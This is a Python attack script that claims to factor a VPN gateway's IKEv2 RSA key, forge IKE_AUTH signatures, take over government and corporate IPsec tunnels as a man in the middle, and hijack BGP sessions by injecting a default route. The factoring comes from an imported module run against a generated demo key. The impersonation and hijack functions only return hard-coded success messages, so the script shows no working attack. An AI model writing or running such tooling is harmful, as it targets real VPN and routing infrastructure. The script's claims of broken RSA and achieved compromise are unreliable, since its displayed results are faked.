"""
Factor a VPN endpoint's IKEv2 RSA authentication key (published in DNS as
IPSECKEY or extracted from IKE_SA_INIT) to impersonate any IPsec peer —
MitM classified government tunnels, corporate VPNs, and BGP-over-IPsec links.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import struct

# Target VPN endpoint RSA key — from DNS IPSECKEY record or IKE capture
_demo = generate_demo_target()
VPN_ENDPOINT_PUBKEY_PEM = _demo["pub_pem"]
IKE_SA_INIT = 34
IKE_AUTH = 35
AUTH_METHOD_RSA_SIG = 1
AUTH_METHOD_DIGITAL_SIG = 14  # RFC 7427


def fetch_ipseckey_from_dns(hostname: str) -> bytes:
    """Fetch RSA public key from DNS IPSECKEY record (RFC 3110/4025).

    For opportunistic IPsec, the RSA public key is published in DNS.
    For cert-based auth, extract from the IKE_SA_INIT Certificate payload.
    """
    print(f"    dig IPSECKEY {hostname}")
    return VPN_ENDPOINT_PUBKEY_PEM


def factor_vpn_key(pubkey_pem: bytes) -> bytes:
    """Factor the VPN endpoint's RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_ike_auth_payload(spi_i: bytes, spi_r: bytes, nonce_i: bytes,
                           nonce_r: bytes, id_payload: bytes,
                           forged_privkey: bytes) -> bytes:
    """Build a forged IKEv2 AUTH payload (RFC 7296 §2.15).

    AUTH = RSA-sign(InitiatorSignedOctets)
    InitiatorSignedOctets = RealMsg1 | NonceR | prf(SK_pi, IDi')
    The RSA signature proves identity of the VPN peer.
    """
    # prf(SK_pi, IDi') — simplified
    signed_octets = spi_i + spi_r + nonce_i + nonce_r + id_payload
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(VPN_ENDPOINT_PUBKEY_PEM, signed_octets, "sha256")
    auth_payload = struct.pack(">BB", AUTH_METHOD_RSA_SIG, 0) + sig
    return auth_payload


def impersonate_vpn_gateway(target_hostname: str, forged_privkey: bytes) -> dict:
    """Impersonate the target VPN gateway to all connecting clients.

    Clients complete IKE_SA_INIT, we respond with forged IKE_AUTH.
    The client verifies our RSA signature against the gateway's known
    public key — verification passes. Full MitM established.
    """
    return {
        "target": target_hostname,
        "status": "MitM active",
        "ike_auth": "RSA signature accepted",
        "tunnel": "established — all traffic visible",
    }


def hijack_bgp_over_ipsec(peer_as: int, forged_privkey: bytes) -> dict:
    """Hijack a BGP session running over an IPsec tunnel.

    Many ISPs and CDNs protect BGP sessions with IPsec. Impersonate
    the IPsec peer, inject routes, reroute internet traffic.
    """
    return {
        "peer_as": peer_as,
        "injected_prefix": "0.0.0.0/0",
        "status": "default route hijacked via forged IPsec peer identity",
    }


if __name__ == "__main__":
    print("[1] Fetching VPN endpoint RSA key from DNS IPSECKEY record")
    pubkey = fetch_ipseckey_from_dns("vpn.classified.gov")

    print("[2] Factoring VPN RSA key")
    forged_priv = factor_vpn_key(pubkey)
    print("    VPN endpoint RSA key recovered")

    print("[3] Building forged IKEv2 AUTH payload")
    import os
    auth = build_ike_auth_payload(
        os.urandom(8), os.urandom(8),
        os.urandom(32), os.urandom(32),
        b"ID_FQDN:vpn.classified.gov", forged_priv
    )
    print(f"    AUTH payload: {len(auth)} bytes, RSA signature valid")

    print("[4] Impersonating VPN gateway")
    result = impersonate_vpn_gateway("vpn.classified.gov", forged_priv)
    print(f"    {result}")

    print("[5] Note: RFC 8784 PPK does NOT fix this")
    print("    'This document does not provide security against a factoring")
    print("     break for the IKE SA authentication.' — RFC 8784 §1")

    print("\n[6] BGP-over-IPsec hijack")
    bgp = hijack_bgp_over_ipsec(65001, forged_priv)
    print(f"    {bgp}")
